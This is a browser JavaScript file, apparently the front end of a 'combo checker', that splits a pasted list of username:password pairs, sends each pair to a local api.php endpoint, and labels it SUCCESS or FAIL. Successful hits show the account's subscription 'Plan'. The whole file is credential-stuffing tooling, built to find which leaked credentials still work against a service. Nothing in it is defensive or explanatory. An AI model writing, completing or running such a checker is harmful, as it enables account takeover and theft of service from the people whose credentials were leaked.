function start() {
    var textArea = document.getElementById("combos")
    var combos = textArea.value.split("\n")

    combos.forEach(checker)

    function checker(combo) {
        var username = combo.split(":")[0]
        var password = combo.split(":")[1]

        var spanBadge = document.createElement("span")
        var spanBadgeInfo = document.createElement("span")
        var spanDiv = document.createElement("div")

        var resultsDiv = document.getElementById("results")

        fetch("api.php?username=" + username + "&password=" + password)
            .then(function (response) {
                return response.json()
            })
            .then(function (data) {
                if (data['Success']) {
                    spanBadge.className = 'badge bg-success'
                    spanBadgeInfo.className = 'text-dark'

                    spanBadge.innerText = 'SUCCESS'
                    spanBadgeInfo.innerText = " " + username + ":" + password + " Plan= " + data['Plan']

                    spanDiv.appendChild(spanBadge)
                    spanDiv.appendChild(spanBadgeInfo)


                    resultsDiv.appendChild(spanDiv)
                }
                else {
                    spanBadge.className = 'badge bg-danger'
                    spanBadgeInfo.className = 'text-dark'

                    spanBadge.innerText = 'FAIL'
                    spanBadgeInfo.innerText = " " + username + ":" + password

                    spanDiv.appendChild(spanBadge)
                    spanDiv.appendChild(spanBadgeInfo)


                    resultsDiv.appendChild(spanDiv)
                }
            })
    }
}